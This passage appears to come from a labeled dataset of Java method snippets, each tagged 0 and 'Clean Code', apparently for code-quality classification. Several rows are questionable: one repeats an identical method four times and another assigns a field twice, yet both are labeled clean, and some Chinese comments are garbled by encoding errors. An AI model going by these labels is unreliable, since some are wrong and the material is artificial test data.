return ""AMR-NB"";
case MimeTypes.AUDIO_AMR_WB:
return ""AMR-WB"";
case MimeTypes.APPLICATION_PGS:
return ""PGS"";
case MimeTypes.APPLICATION_SUBRIP:
return ""SRT"";
case MimeTypes.TEXT_SSA:
return ""SSA"";
case MimeTypes.TEXT_VTT:
return ""VTT"";
case MimeTypes.APPLICATION_TTML:
return ""TTML"";
case MimeTypes.APPLICATION_TX3G:
return ""TX3G"";
case MimeTypes.APPLICATION_DVBSUBS:
return ""DVB"";
}
return null;
}",0,Clean Code
"@Override public final void onMessage(Message message,byte[] bytes){
  T messageObj=JsonUtils.parseObject(message.getBody(),messageType);
  try {
    consumeMessageBefore(messageObj);
    this.onMessage(messageObj);
  }
  finally {
    consumeMessageAfter(messageObj);
  }
}
/** 
 * 澶勭悊娑堟伅
 * @param message 娑堟伅
 */
public abstract void onMessage(T message);
",0,Clean Code
"/** 
 * Creates arguments for a browse fragment.
 * @param args The Bundle to place arguments into, or null if the methodshould return a new Bundle.
 * @param title The title of the BrowseFragment.
 * @param headersState The initial state of the headers of theBrowseFragment. Must be one of  {@link #HEADERS_ENABLED},  {@link #HEADERS_HIDDEN}, or  {@link #HEADERS_DISABLED}.
 * @return A Bundle with the given arguments for creating a BrowseFragment.
 */
public static Bundle createArgs(Bundle args,String title,int headersState){
  if (args == null) {
    args=new Bundle();
  }
  args.putString(ARG_TITLE,title);
  args.putInt(ARG_HEADERS_STATE,headersState);
  return args;
}
",0,Clean Code
"/** 
 * Dispatches  {@link #onLoadError(int,MediaPeriodId,LoadEventInfo,MediaLoadData,IOException,boolean)}.
 */
public void loadError(DataSpec dataSpec,Uri uri,Map<String,List<String>> responseHeaders,int dataType,long elapsedRealtimeMs,long loadDurationMs,long bytesLoaded,IOException error,boolean wasCanceled){
  loadError(dataSpec,uri,responseHeaders,dataType,C.TRACK_TYPE_UNKNOWN,null,C.SELECTION_REASON_UNKNOWN,null,C.TIME_UNSET,C.TIME_UNSET,elapsedRealtimeMs,loadDurationMs,bytesLoaded,error,wasCanceled);
}
/** 
 * Dispatches  {@link #onLoadError(int,MediaPeriodId,LoadEventInfo,MediaLoadData,IOException,boolean)}.
 */
public void loadError(DataSpec dataSpec,Uri uri,Map<String,List<String>> responseHeaders,int dataType,int trackType,@Nullable Format trackFormat,int trackSelectionReason,@Nullable Object trackSelectionData,long mediaStartTimeUs,long mediaEndTimeUs,long elapsedRealtimeMs,long loadDurationMs,long bytesLoaded,IOException error,boolean wasCanceled){
  loadError(new LoadEventInfo(dataSpec,uri,responseHeaders,elapsedRealtimeMs,loadDurationMs,bytesLoaded),new MediaLoadData(dataType,trackType,trackFormat,trackSelectionReason,trackSelectionData,adjustMediaTime(mediaStartTimeUs),adjustMediaTime(mediaEndTimeUs)),error,wasCanceled);
}
/** 
 * Dispatches  {@link #onLoadError(int,MediaPeriodId,LoadEventInfo,MediaLoadData,IOException,boolean)}.
 */
public void loadError(LoadEventInfo loadEventInfo,MediaLoadData mediaLoadData,IOException error,boolean wasCanceled){
  for (  ListenerAndHandler listenerAndHandler : listenerAndHandlers) {
    final MediaSourceEventListener listener=listenerAndHandler.listener;
    postOrRun(listenerAndHandler.handler,() -> listener.onLoadError(windowIndex,mediaPeriodId,loadEventInfo,mediaLoadData,error,wasCanceled));
  }
}
",0,Clean Code
"@Override public boolean onTouch(View v,MotionEvent event){
  if (v == mouseButton_wheel_up || v == mouseButton_wheel_down) {
switch (event.getAction()) {
case MotionEvent.ACTION_DOWN:
      hasHeld=false;
    this.EVENT_DOWN_TIME=event.getDownTime();
  break;
case MotionEvent.ACTION_MOVE:
if (event.getEventTime() - EVENT_DOWN_TIME >= MIN_HOLDING_TIME && !hasHeld) {
  int index;
  hasHeld=true;
  if (v == mouseButton_wheel_up) {
    index=INDEX_BUTTON_WHEEL_UP;
    mController.sendKey(new BaseKeyEvent(TAG,mouseButton_wheel_up.getMouseName(),false,type,null));
  }
 else {
    mController.sendKey(new BaseKeyEvent(TAG,mouseButton_wheel_down.getMouseName(),false,type,null));
    index=INDEX_BUTTON_WHEEL_DOWN;
  }
  mTimer=new Timer();
  mTimer.schedule(createTask(index),REFRESH_DELAY,REFRESH_PERIOD);
}
return true;
case MotionEvent.ACTION_UP:
if (hasHeld) {
mTimer.cancel();
return true;
}
}
}
if (v instanceof MouseButton) {
sendKeyEvent(v,event);
return true;
}
if (v == moveButton) {
moveViewByTouch(onscreenMouse,event);
return true;
}
return false;
}
",0,Clean Code
"/** 
 * 鑾峰彇鏈湴缂撳瓨鏂囦欢鍐呭銆侼ULL琛ㄧず娌℃湁鏈湴鏂囦欢鎴栨姏鍑哄紓甯搞��
 */
static public String getSnapshot(String name,String dataId,String group,String tenant){
  if (!SnapShotSwitch.getIsSnapShot()) {
    return null;
  }
  File file=getSnapshotFile(name,dataId,group,tenant);
  if (!file.exists() || !file.isFile()) {
    return null;
  }
  try {
    return readFile(file);
  }
 catch (  IOException ioe) {
    LOGGER.error(""["" + name + ""]+get snapshot error, ""+ file,ioe);
    return null;
  }
}
",0,Clean Code
"/** 
 * 编辑工程
 * @param request
 * @param projectModifyRequest
 * @return
 */
@RequestMapping(path=""modifyProject"",method=RequestMethod.POST) public Message modifyProject(HttpServletRequest request,@RequestBody ProjectModifyRequest projectModifyRequest) throws Exception {
  if (projectModifyRequest.getId() == null || projectModifyRequest.getId() < 0) {
    return Message.error(""project id is null, cannot modify it."");
  }
  String username=SecurityFilter.getLoginUsername(request);
  Workspace workspace=SSOHelper.getWorkspace(request);
  LOGGER.info(""user {} begin to modifyProject, workspace {}, project entity: {}."",username,workspace.getWorkspaceName(),projectModifyRequest);
  Message message=executePreHook(projectHttpRequestHook -> projectHttpRequestHook.beforeModifyProject(request,projectModifyRequest));
  if (message != null) {
    return message;
  }
  if (projectModifyRequest.getDescription().length() > MAX_DESC_LENGTH) {
    return Message.error(""The project description information is too long, exceeding the maximum length:"" + MAX_DESC_LENGTH);
  }
  if (org.apache.commons.lang.StringUtils.isNotEmpty(projectModifyRequest.getBusiness()) && projectModifyRequest.getBusiness().length() > MAX_BUSSINESS_SIZE) {
    return Message.error(""The project bussiness is too long, exceeding the maximum length:"" + MAX_BUSSINESS_SIZE);
  }
  DSSProjectDO dbProject=dssProjectService.getProjectById(projectModifyRequest.getId());
  if (dbProject == null) {
    LOGGER.error(""project {} is not exists."",projectModifyRequest.getName());
    return Message.error(String.format(""project %s is not exists."",projectModifyRequest.getName()));
  }
  String createUsername=dbProject.getUsername();
  if (!projectModifyRequest.getEditUsers().contains(createUsername)) {
    projectModifyRequest.getEditUsers().add(createUsername);
  }
  List<String> releaseUsers=projectModifyRequest.getReleaseUsers();
  if (releaseUsers == null) {
    releaseUsers=new ArrayList<>();
    projectModifyRequest.setReleaseUsers(releaseUsers);
  }
  if (!releaseUsers.contains(createUsername)) {
    releaseUsers.add(createUsername);
  }
  return DSSExceptionUtils.getMessage(() -> {
    dssFrameworkProjectService.modifyProject(projectModifyRequest,dbProject,username,workspace);
    AuditLogUtils.printLog(username,workspace.getWorkspaceId(),workspace.getWorkspaceName(),TargetTypeEnum.PROJECT,projectModifyRequest.getId(),projectModifyRequest.getName(),OperateTypeEnum.UPDATE,projectModifyRequest);
  }
,() -> executeAfterHook(projectHttpRequestHook -> projectHttpRequestHook.afterModifyProject(request,projectModifyRequest),() -> Message.ok(""修改工程成功."")),String.format(""用户 %s 修改工程 %s 失败. "",username,projectModifyRequest.getName()));
}",0,Clean Code
"public static boolean isValid1(String s){
  if (s.length() % 2 == 1) {
    return false;
  }
  if (s.isEmpty())   return true;
  Stack<Character> stack=new Stack<Character>();
  for (  char c : s.toCharArray()) {
    if (c == '(')     stack.push(')');
 else     if (c == '{')     stack.push('}');
 else     if (c == '[')     stack.push(']');
 else     if (stack.empty() || c != stack.pop())     return false;
  }
  if (stack.empty())   return true;
  return false;
}",0,Clean Code
"@Override protected void onPause(){
  super.onPause();
  isResumed=false;
  NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.stopAllHeavyOperations,4096);
  ApplicationLoader.mainInterfacePaused=true;
  int account=currentAccount;
  Utilities.stageQueue.postRunnable(() -> {
    ApplicationLoader.mainInterfacePausedStageQueue=true;
    ApplicationLoader.mainInterfacePausedStageQueueTime=0;
    if (VoIPService.getSharedInstance() == null) {
      MessagesController.getInstance(account).ignoreSetOnline=false;
    }
  }
);
  onPasscodePause();
  try {
    if (actionBarLayout != null) {
      actionBarLayout.onPause();
    }
    if (AndroidUtilities.isTablet()) {
      if (rightActionBarLayout != null) {
        rightActionBarLayout.onPause();
      }
      if (layersActionBarLayout != null) {
        layersActionBarLayout.onPause();
      }
    }
    if (passcodeView != null) {
      passcodeView.onPause();
    }
  }
 catch (  Exception ignored) {
  }
  for (  PasscodeView overlay : overlayPasscodeViews) {
    overlay.onPause();
  }
  boolean doNotPause=false;
  if (ApplicationLoader.applicationLoaderInstance != null) {
    doNotPause=ApplicationLoader.applicationLoaderInstance.onPause();
  }
  ConnectionsManager.getInstance(currentAccount).setAppPaused(!doNotPause,false);
  if (PhotoViewer.hasInstance() && PhotoViewer.getInstance().isVisible()) {
    PhotoViewer.getInstance().onPause();
  }
  StoryRecorder.onPause();
  if (VoIPFragment.getInstance() != null) {
    VoIPFragment.onPause();
  }
  SpoilerEffect2.pause(true);
}",0,Clean Code
"private static Bitmap drawableToBitmap(Drawable drawable){
  if (drawable == null)   return null;
  if (drawable instanceof BitmapDrawable) {
    return ((BitmapDrawable)drawable).getBitmap();
  }
  Bitmap bitmap;
  int width=Math.max(drawable.getIntrinsicWidth(),2);
  int height=Math.max(drawable.getIntrinsicHeight(),2);
  try {
    bitmap=Bitmap.createBitmap(width,height,Config.ARGB_8888);
    Canvas canvas=new Canvas(bitmap);
    drawable.setBounds(0,0,canvas.getWidth(),canvas.getHeight());
    drawable.draw(canvas);
  }
 catch (  IllegalArgumentException e) {
    e.printStackTrace();
    bitmap=null;
  }
  return bitmap;
}",0,Clean Code
"@EventHandler private void onMouseButton(MouseButtonEvent event){
  if (event.action != KeyAction.Press || event.button != GLFW_MOUSE_BUTTON_MIDDLE || mc.currentScreen != null)   return;
  if (mode.get() == Mode.AddFriend) {
    if (mc.targetedEntity == null)     return;
    if (!(mc.targetedEntity instanceof PlayerEntity))     return;
    if (!Friends.get().isFriend(player)) {
      Friends.get().add(new Friend(player));
      info(""Added %s to friends"",player.getName().getString());
      if (message.get())       ChatUtils.sendPlayerMsg(""/msg "" + player.getName() + "" I just friended you on Meteor."");
    }
 else {
      Friends.get().remove(Friends.get().get(player));
      info(""Removed %s from friends"",player.getName().getString());
    }
    return;
  }
  FindItemResult result=InvUtils.find(mode.get().item);
  if (!result.found() || !result.isHotbar() && !quickSwap.get()) {
    if (notify.get())     warning(""Unable to find specified item."");
    return;
  }
  selectedSlot=mc.player.getInventory().selectedSlot;
  itemSlot=result.slot();
  wasHeld=result.isMainHand();
  if (!wasHeld) {
    if (!quickSwap.get())     InvUtils.swap(result.slot(),swapBack.get());
 else     InvUtils.quickSwap().fromId(selectedSlot).to(itemSlot);
  }
  if (mode.get().immediate) {
    mc.interactionManager.interactItem(mc.player,Hand.MAIN_HAND);
    swapBack(false);
  }
 else {
    mc.options.useKey.setPressed(true);
    isUsing=true;
  }
}
",0,Clean Code
"private void invalidateChatListViewTopPadding(){
  if (!invalidateChatListViewTopPadding) {
    invalidateChatListViewTopPadding=true;
    if (contentView != null) {
      contentView.invalidate();
    }
    if (chatListView != null) {
      chatListView.invalidate();
    }
  }
  int topPanelHeight=topChatPanelView != null && topChatPanelView.getVisibility() == View.VISIBLE ? ((topChatPanelView.getLayoutParams() == null ? AndroidUtilities.dp(50) : topChatPanelView.getLayoutParams().height) - AndroidUtilities.dp(2)) : 0;
  topPanelHeight=topPanelHeight + (int)Math.max(-topPanelHeight,topChatPanelViewOffset);
  float translation=contentPanTranslation + contentPaddingTop + Math.max(0,topPanelHeight);
  if (pinnedMessageView != null) {
    translation+=pinnedMessageEnterOffset;
    pinnedMessageView.setTranslationY(translation);
    translation+=AndroidUtilities.dp(48);
  }
  View pendingRequestsView=pendingRequestsDelegate != null ? pendingRequestsDelegate.getView() : null;
  if (pendingRequestsView != null) {
    translation+=pendingRequestsDelegate.getViewEnterOffset();
    pendingRequestsView.setTranslationY(translation);
  }
  if (fragmentContextView != null) {
    float from=0;
    if (fragmentLocationContextView != null && fragmentLocationContextView.getVisibility() == View.VISIBLE) {
      from+=AndroidUtilities.dp(36);
    }
    fragmentContextView.setTranslationY(contentPanTranslation + from + fragmentContextView.getTopPadding());
  }
  if (fragmentLocationContextView != null) {
    float from=0;
    if (fragmentContextView != null && fragmentContextView.getVisibility() == View.VISIBLE) {
      from+=AndroidUtilities.dp(fragmentContextView.getStyleHeight()) + fragmentContextView.getTopPadding();
    }
    fragmentLocationContextView.setTranslationY(contentPanTranslation + from + fragmentLocationContextView.getTopPadding());
  }
  if (topChatPanelView != null) {
    topChatPanelView.setTranslationY(contentPanTranslation + contentPaddingTop + topChatPanelViewOffset);
  }
  if (alertView != null && alertView.getVisibility() == View.VISIBLE) {
    alertView.setTranslationY(contentPanTranslation + contentPaddingTop - AndroidUtilities.dp(50) * (1f - alertViewEnterProgress));
  }
  if (bottomOverlayChat != null) {
    bottomOverlayChat.setTranslationY(bottomPanelTranslationYReverse);
  }
  if (bottomMessagesActionContainer != null) {
    bottomMessagesActionContainer.setTranslationY(bottomPanelTranslationYReverse);
  }
  if (undoView != null) {
    undoView.setAdditionalTranslationY(chatActivityEnterView.getHeightWithTopView() - chatActivityEnterView.getAnimatedTop());
  }
}",0,Clean Code
"/** 
 * Creates a Projection with single mesh.
 * @param mesh the Mesh for both eyes.
 * @param stereoMode A {@link StereoMode} value.
 */
public Projection(Mesh mesh,int stereoMode){
  this(mesh,mesh,stereoMode);
}
/** 
 * Creates a Projection with dual mesh. Use  {@link #Projection(Mesh,int)} if there is single meshfor both eyes.
 * @param leftMesh the Mesh corresponding to the left eye.
 * @param rightMesh the Mesh corresponding to the right eye.
 * @param stereoMode A {@link C.StereoMode} value.
 */
public Projection(Mesh leftMesh,Mesh rightMesh,int stereoMode){
  this.leftMesh=leftMesh;
  this.rightMesh=rightMesh;
  this.stereoMode=stereoMode;
  this.singleMesh=leftMesh == rightMesh;
}
",0,Clean Code
"/** 
 * Returns the child container of the given type. <p>If no child exists with the given type then null is returned. If multiple children exist with the given type then the first one to have been added is returned.
 * @param type The container type.
 * @return The child container of the given type, or null if no such child exists.
 */
public @Nullable ContainerAtom getContainerAtomOfType(int type){
  int childrenSize=containerChildren.size();
  for (int i=0; i < childrenSize; i++) {
    ContainerAtom atom=containerChildren.get(i);
    if (atom.type == type) {
      return atom;
    }
  }
  return null;
}",0,Clean Code
"/** 
 * 缁熶竴澶勭悊鏁版嵁
 * @param list        璇锋眰澶存暟鎹�
 * @param importExcel 鏄惁鏄鍏ユā鏉�
 * @return 杞寲鍚庣殑璇锋眰澶存暟鎹�
 */
public List<ExcelDataEntity> parseData(List<?> list,boolean importExcel){
  List<ExcelDataEntity> entities=list.stream().map(obj -> {
    if (obj instanceof ExcelDataEntity) {
      return (ExcelDataEntity)obj;
    }
    return BeanUtil.copyProperties(obj,ExcelDataEntity.class);
  }
).collect(Collectors.toList());
  if (importExcel) {
    entities.removeIf(head -> ExcelParseUtil.removeFieldByType(head.getType()));
  }
 else {
    entities.removeIf(head -> FieldEnum.HANDWRITING_SIGN.getType().equals(head.getType()));
  }
  return entities;
}
",0,Clean Code
"private int pthread_clone(Emulator<?> emulator){
  RegisterContext context=emulator.getContext();
  int flags=context.getIntArg(0);
  UnidbgPointer child_stack=context.getPointerArg(1);
  List<String> list=new ArrayList<>();
  if ((flags & CLONE_VM) != 0) {
    list.add(""CLONE_VM"");
  }
  if ((flags & CLONE_FS) != 0) {
    list.add(""CLONE_FS"");
  }
  if ((flags & CLONE_FILES) != 0) {
    list.add(""CLONE_FILES"");
  }
  if ((flags & CLONE_SIGHAND) != 0) {
    list.add(""CLONE_SIGHAND"");
  }
  if ((flags & CLONE_PTRACE) != 0) {
    list.add(""CLONE_PTRACE"");
  }
  if ((flags & CLONE_VFORK) != 0) {
    list.add(""CLONE_VFORK"");
  }
  if ((flags & CLONE_PARENT) != 0) {
    list.add(""CLONE_PARENT"");
  }
  if ((flags & CLONE_THREAD) != 0) {
    list.add(""CLONE_THREAD"");
  }
  if ((flags & CLONE_NEWNS) != 0) {
    list.add(""CLONE_NEWNS"");
  }
  if ((flags & CLONE_SYSVSEM) != 0) {
    list.add(""CLONE_SYSVSEM"");
  }
  if ((flags & CLONE_SETTLS) != 0) {
    list.add(""CLONE_SETTLS"");
  }
  if ((flags & CLONE_PARENT_SETTID) != 0) {
    list.add(""CLONE_PARENT_SETTID"");
  }
  if ((flags & CLONE_CHILD_CLEARTID) != 0) {
    list.add(""CLONE_CHILD_CLEARTID"");
  }
  if ((flags & CLONE_DETACHED) != 0) {
    list.add(""CLONE_DETACHED"");
  }
  if ((flags & CLONE_UNTRACED) != 0) {
    list.add(""CLONE_UNTRACED"");
  }
  if ((flags & CLONE_CHILD_SETTID) != 0) {
    list.add(""CLONE_CHILD_SETTID"");
  }
  if ((flags & CLONE_STOPPED) != 0) {
    list.add(""CLONE_STOPPED"");
  }
  int threadId=incrementThreadId(emulator);
  UnidbgPointer fn=child_stack.getPointer(0);
  child_stack=child_stack.share(8,0);
  UnidbgPointer arg=child_stack.getPointer(0);
  child_stack=child_stack.share(8,0);
  if (threadDispatcherEnabled) {
    throw new UnsupportedOperationException();
  }
  log.info(""pthread_clone child_stack={}, thread_id={}, fn={}, arg={}, flags={}"",child_stack,threadId,fn,arg,list);
  Logger log=LoggerFactory.getLogger(AbstractEmulator.class);
  if (log.isDebugEnabled()) {
    emulator.attach().debug();
  }
  return threadId;
}",0,Clean Code
"private static boolean isMovementAllowedFallback(BlockState state,Level world,BlockPos pos){
  Block block=state.getBlock();
  if (block instanceof AbstractChassisBlock)   return true;
  if (state.getDestroySpeed(world,pos) == -1)   return false;
  if (AllBlockTags.RELOCATION_NOT_SUPPORTED.matches(state))   return false;
  if (AllBlockTags.NON_MOVABLE.matches(state))   return false;
  if (ContraptionMovementSetting.get(state.getBlock()) == ContraptionMovementSetting.UNMOVABLE)   return false;
  if (block instanceof MechanicalPistonBlock && state.getValue(MechanicalPistonBlock.STATE) != PistonState.MOVING)   return true;
  if (block instanceof MechanicalBearingBlock) {
    BlockEntity be=world.getBlockEntity(pos);
    if (be instanceof MechanicalBearingBlockEntity)     return !((MechanicalBearingBlockEntity)be).isRunning();
  }
  if (block instanceof ClockworkBearingBlock) {
    BlockEntity be=world.getBlockEntity(pos);
    if (be instanceof ClockworkBearingBlockEntity)     return !((ClockworkBearingBlockEntity)be).isRunning();
  }
  if (block instanceof PulleyBlock) {
    BlockEntity be=world.getBlockEntity(pos);
    if (be instanceof PulleyBlockEntity)     return !((PulleyBlockEntity)be).running;
  }
  if (AllBlocks.BELT.has(state))   return true;
  if (state.getBlock() instanceof GrindstoneBlock)   return true;
  if (state.getBlock() instanceof ITrackBlock)   return false;
  if (state.getBlock() instanceof StationBlock)   return false;
  return state.getPistonPushReaction() != PushReaction.BLOCK;
}",0,Clean Code
"public Criteria andSourceLessThan(String value){
  addCriterion(""source <"",value,""source"");
  return (Criteria)this;
}
public Criteria andSourceLessThan(String value){
  addCriterion(""source <"",value,""source"");
  return (Criteria)this;
}
public Criteria andSourceLessThan(String value){
  addCriterion(""source <"",value,""source"");
  return (Criteria)this;
}
public Criteria andSourceLessThan(String value){
  addCriterion(""source <"",value,""source"");
  return (Criteria)this;
}
",0,Clean Code
"void doCreateSstFiles(final Snapshot snapshot,final EnumMap<SstColumnFamily,File> sstFileTable,final byte[] startKey,final byte[] endKey,final CompletableFuture<Void> future){
  final Timer.Context timeCtx=getTimeContext(""CREATE_SST_FILE"");
  final Lock readLock=this.readWriteLock.readLock();
  readLock.lock();
  try {
    if (!this.shutdownLock.isAvailable()) {
      future.completeExceptionally(new StorageException(""KV store has shutdown.""));
      return;
    }
    try (final ReadOptions readOptions=new ReadOptions();final EnvOptions envOptions=new EnvOptions();final Options options=new Options().setMergeOperator(new StringAppendOperator())){
      readOptions.setSnapshot(snapshot);
      for (      final Map.Entry<SstColumnFamily,File> entry : sstFileTable.entrySet()) {
        final SstColumnFamily sstColumnFamily=entry.getKey();
        final File sstFile=entry.getValue();
        final ColumnFamilyHandle columnFamilyHandle=findColumnFamilyHandle(sstColumnFamily);
        try (final RocksIterator it=this.db.newIterator(columnFamilyHandle,readOptions);final SstFileWriter sstFileWriter=new SstFileWriter(envOptions,options)){
          if (startKey == null) {
            it.seekToFirst();
          }
 else {
            it.seek(startKey);
          }
          sstFileWriter.open(sstFile.getAbsolutePath());
          long count=0;
          for (; ; ) {
            if (!it.isValid()) {
              break;
            }
            final byte[] key=it.key();
            if (endKey != null && BytesUtil.compare(key,endKey) >= 0) {
              break;
            }
            sstFileWriter.put(key,it.value());
            ++count;
            it.next();
          }
          if (count == 0) {
            sstFileWriter.close();
          }
 else {
            sstFileWriter.finish();
          }
          LOG.info(""Finish sst file {} with {} keys."",sstFile,count);
        }
 catch (        final RocksDBException e) {
          throw new StorageException(""Fail to create sst file at path: "" + sstFile,e);
        }
      }
      future.complete(null);
    }
 catch (    final Throwable t) {
      future.completeExceptionally(t);
    }
 finally {
      snapshot.close();
      this.db.releaseSnapshot(snapshot);
    }
  }
  finally {
    readLock.unlock();
    timeCtx.stop();
  }
}",0,Clean Code
"@Override public SearchResult searchMod(SearchFilters searchFilters,SearchResult previousPageResult){
  CommonApiSearchResult commonApiSearchResult=(CommonApiSearchResult)previousPageResult;
  SearchResult[] results=commonApiSearchResult == null ? new SearchResult[mModpackApis.length] : commonApiSearchResult.searchResults;
  int totalSize=0;
  Future<?>[] futures=new Future<?>[mModpackApis.length];
  for (int i=0; i < mModpackApis.length; i++) {
    if (results[i] != null && results[i].results.length == 0)     continue;
    if (previousPageResult != null && results[i] == null)     continue;
    futures[i]=PojavApplication.sExecutorService.submit(new ApiDownloadTask(i,searchFilters,results[i]));
  }
  if (Thread.interrupted()) {
    cancelAllFutures(futures);
    return null;
  }
  boolean hasSuccessful=false;
  for (int i=0; i < mModpackApis.length; i++) {
    Future<?> future=futures[i];
    if (future == null)     continue;
    try {
      SearchResult searchResult=results[i]=(SearchResult)future.get();
      if (searchResult != null)       hasSuccessful=true;
 else       continue;
      totalSize+=searchResult.totalResultCount;
    }
 catch (    Exception e) {
      cancelAllFutures(futures);
      e.printStackTrace();
      return null;
    }
  }
  if (!hasSuccessful) {
    return null;
  }
  ArrayList<ModItem[]> filteredResults=new ArrayList<>(results.length);
  for (  SearchResult result : results) {
    if (result == null)     continue;
    ModItem[] searchResults=result.results;
    if (searchResults.length == 0)     continue;
    filteredResults.add(searchResults);
  }
  filteredResults.trimToSize();
  if (Thread.interrupted())   return null;
  ModItem[] concatenatedItems=buildFusedResponse(filteredResults);
  if (Thread.interrupted())   return null;
  if (commonApiSearchResult == null)   commonApiSearchResult=new CommonApiSearchResult();
  commonApiSearchResult.searchResults=results;
  commonApiSearchResult.totalResultCount=totalSize;
  commonApiSearchResult.results=concatenatedItems;
  return commonApiSearchResult;
}",0,Clean Code
"public void validateQuery(SqlNode node,SqlValidatorScope scope,RelDataType targetRowType){
  final SqlValidatorNamespace ns=getNamespace(node,scope);
  if (node.getKind() == SqlKind.TABLESAMPLE) {
    List<SqlNode> operands=((SqlCall)node).getOperandList();
    SqlSampleSpec sampleSpec=SqlLiteral.sampleValue(operands.get(1));
    if (sampleSpec instanceof SqlSampleSpec.SqlTableSampleSpec) {
      validateFeature(RESOURCE.sQLFeature_T613(),node.getParserPosition());
    }
 else     if (sampleSpec instanceof SqlSampleSpec.SqlSubstitutionSampleSpec) {
      validateFeature(RESOURCE.sQLFeatureExt_T613_Substitution(),node.getParserPosition());
    }
  }
  validateNamespace(ns,targetRowType);
switch (node.getKind()) {
case EXTEND:
    deriveType(scope,node);
}
if (node == top) {
  validateModality(node);
}
validateAccess(node,ns.getTable(),SqlAccessEnum.SELECT);
if (node.getKind() == SqlKind.SNAPSHOT) {
  SqlSnapshot snapshot=(SqlSnapshot)node;
  SqlNode period=snapshot.getPeriod();
  RelDataType dataType=deriveType(scope,period);
  if (dataType.getSqlTypeName() != SqlTypeName.TIMESTAMP) {
    throw newValidationError(period,Static.RESOURCE.illegalExpressionForTemporal(dataType.getSqlTypeName().getName()));
  }
  if (!ns.getTable().isTemporal()) {
    List<String> qualifiedName=ns.getTable().getQualifiedName();
    String tableName=qualifiedName.get(qualifiedName.size() - 1);
    throw newValidationError(snapshot.getTableRef(),Static.RESOURCE.notTemporalTable(tableName));
  }
}
}",0,Clean Code
"public void visitConstantInstruction(Clazz clazz,Method method,CodeAttribute codeAttribute,int offset,ConstantInstruction constantInstruction){
  byte opcode=constantInstruction.opcode;
switch (opcode) {
case Instruction.OP_GETSTATIC:
    writingField=false;
  clazz.constantPoolEntryAccept(constantInstruction.constantIndex,this);
break;
case Instruction.OP_PUTSTATIC:
writingField=true;
clazz.constantPoolEntryAccept(constantInstruction.constantIndex,this);
break;
case Instruction.OP_GETFIELD:
if (includeBuiltInExceptions) {
hasSideEffects=true;
}
 else {
writingField=false;
clazz.constantPoolEntryAccept(constantInstruction.constantIndex,this);
}
break;
case Instruction.OP_PUTFIELD:
if (includeBuiltInExceptions) {
hasSideEffects=true;
}
 else {
writingField=true;
clazz.constantPoolEntryAccept(constantInstruction.constantIndex,this);
}
break;
case Instruction.OP_INVOKESPECIAL:
case Instruction.OP_INVOKESTATIC:
clazz.constantPoolEntryAccept(constantInstruction.constantIndex,this);
break;
case Instruction.OP_INVOKEVIRTUAL:
case Instruction.OP_INVOKEINTERFACE:
case Instruction.OP_INVOKEDYNAMIC:
if (includeBuiltInExceptions) {
hasSideEffects=true;
}
 else {
clazz.constantPoolEntryAccept(constantInstruction.constantIndex,this);
}
break;
case Instruction.OP_ANEWARRAY:
case Instruction.OP_MULTIANEWARRAY:
case Instruction.OP_CHECKCAST:
hasSideEffects=includeBuiltInExceptions;
break;
}
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.CategoricalIDInfoProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.CategoricalIDInfoProto other=(org.tribuo.protos.core.CategoricalIDInfoProto)obj;
  if (!getName().equals(other.getName()))   return false;
  if (getCount() != other.getCount())   return false;
  if (getId() != other.getId())   return false;
  if (!getKeyList().equals(other.getKeyList()))   return false;
  if (!getValueList().equals(other.getValueList()))   return false;
  if (java.lang.Double.doubleToLongBits(getObservedValue()) != java.lang.Double.doubleToLongBits(other.getObservedValue()))   return false;
  if (getObservedCount() != other.getObservedCount())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public MockHttpServletRequestBuilder getRequestBuilder(String method,String url){
  MockHttpServletRequestBuilder requestBuilder=null;
  if (StringUtils.equalsIgnoreCase(method,""get"")) {
    requestBuilder=MockMvcRequestBuilders.get(url);
  }
 else   if (StringUtils.equalsIgnoreCase(method,""post"")) {
    requestBuilder=MockMvcRequestBuilders.post(url);
  }
 else   if (StringUtils.equalsIgnoreCase(method,""put"")) {
    requestBuilder=MockMvcRequestBuilders.put(url);
  }
 else   if (StringUtils.equalsIgnoreCase(method,""delete"")) {
    requestBuilder=MockMvcRequestBuilders.delete(url);
  }
 else   if (StringUtils.equalsIgnoreCase(method,""patch"")) {
    requestBuilder=MockMvcRequestBuilders.patch(url);
  }
 else   if (StringUtils.equalsIgnoreCase(method,""head"")) {
    requestBuilder=MockMvcRequestBuilders.head(url);
  }
 else   if (StringUtils.equalsIgnoreCase(method,""options"")) {
    requestBuilder=MockMvcRequestBuilders.options(url);
  }
 else   if (StringUtils.equalsIgnoreCase(method,""trace"")) {
    requestBuilder=MockMvcRequestBuilders.request(HttpMethod.TRACE,url);
  }
  return requestBuilder;
}
",0,Clean Code
"private static Receiver.AckEntry prepareAckEntry(PushClient client,byte[] dataBytes,Map<String,Object> data,long lastRefTime){
  String key=getACKKey(client.getSocketAddr().getAddress().getHostAddress(),client.getSocketAddr().getPort(),lastRefTime);
  DatagramPacket packet=null;
  try {
    packet=new DatagramPacket(dataBytes,dataBytes.length,client.socketAddr);
    Receiver.AckEntry ackEntry=new Receiver.AckEntry(key,packet);
    ackEntry.data=data;
    ackEntry.data=data;
    return ackEntry;
  }
 catch (  Exception e) {
    Loggers.PUSH.error(""[NACOS-PUSH] failed to prepare data: {} to client: {}, error: {}"",data,client.getSocketAddr(),e);
  }
  return null;
}
private static Receiver.AckEntry prepareAckEntry(PushClient client,Map<String,Object> data,long lastRefTime){
  if (MapUtils.isEmpty(data)) {
    Loggers.PUSH.error(""[NACOS-PUSH] pushing empty data for client is not allowed: {}"",client);
    return null;
  }
  data.put(""lastRefTime"",lastRefTime);
  String key=getACKKey(client.getSocketAddr().getAddress().getHostAddress(),client.getSocketAddr().getPort(),lastRefTime);
  String dataStr=JSON.toJSONString(data);
  try {
    byte[] dataBytes=dataStr.getBytes(StandardCharsets.UTF_8);
    dataBytes=compressIfNecessary(dataBytes);
    DatagramPacket packet=new DatagramPacket(dataBytes,dataBytes.length,client.socketAddr);
    Receiver.AckEntry ackEntry=new Receiver.AckEntry(key,packet);
    ackEntry.data=data;
    return ackEntry;
  }
 catch (  Exception e) {
    Loggers.PUSH.error(""[NACOS-PUSH] failed to prepare data: {} to client: {}, error: {}"",data,client.getSocketAddr(),e);
    return null;
  }
}",0,Clean Code
"@Override public int hashCode(){
  final int prime=31;
  int result=1;
